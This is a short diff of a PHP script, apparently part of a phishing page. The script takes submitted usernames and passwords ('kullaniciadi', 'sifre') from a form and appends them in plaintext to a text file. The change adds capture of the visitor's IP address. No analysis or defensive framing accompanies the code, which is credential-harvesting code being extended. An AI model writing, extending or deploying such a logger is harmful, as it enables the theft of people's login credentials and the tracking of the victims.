@@ -39,7 +39,8 @@
 <?php 
 @$ad=$_POST["kullaniciadi"];
 @$sifre=$_POST["sifre"];
-if($_POST){
+@$ip = getenv('REMOTE_ADDR');
+ if($_POST){
 
 $yaz=fopen("bilgiver.txt","a");
 $icerik="Kullanıcı adı :".$ad." şifre :".$sifre."\n";
